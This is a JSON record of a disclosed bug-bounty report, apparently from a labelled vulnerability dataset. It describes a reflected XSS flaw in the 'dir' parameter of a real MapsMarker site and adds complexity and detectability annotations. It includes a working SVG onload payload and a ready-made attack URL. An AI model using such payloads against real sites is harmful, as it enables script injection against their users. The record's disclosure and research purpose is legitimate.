{
  "reported_to": "MapsMarker.com e.U.",
  "reported_by": "paulochoupina ",
  "title": "Cross-site Scripting (XSS) in /updates-pro/archive/",
  "content": "\nHey guys.\nThe dir parameter on /updates-pro/archive/ seems to be vulnerable to Cross-site Scripting.\nSteps to reproduce:\n1- Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1\n2- Add this to the url: <svG onLoad=prompt(9)>\n3- Result in attached printsceen.\nOr quite simple visit:\nhttps://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1499050980,
  "report_url": "https://hackerone.com/reports/235866",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1"
    ],
    [
      2,
      "Add this to the url: <svG onLoad=prompt(9)> or visit: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E"
    ]
  ],
  "vuln_description": "The dir parameter on /updates-pro/archive/ is vulnerable to Cross-site Scripting (XSS), allowing an attacker to inject arbitrary JavaScript code via the dir parameter.",
  "reason": "The vulnerability is straightforward to discover as it involves a simple XSS payload injected directly into a URL parameter. No complex interactions, application state manipulation, or novel logic is required.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The XSS vulnerability involves injecting malicious scripts via the 'dir' parameter, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, not on detecting input validation flaws like XSS.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves injecting a simple XSS payload into the 'dir' parameter, which is directly reflected in the HTTP response. The methodology would log this parameter during regular navigation (steps 1-3). The payload `<svG onLoad=prompt(9)>` is a basic XSS payload without custom filter bypasses, fitting the 'simple payload' criteria. The injection and execution occur in the same channel (via direct URL modification), and the payload's effect is immediately observable in the HTTP response. No advanced navigation or role-specific access is required to trigger/observe the payload.",
    "is_simple_injection": true
  }
}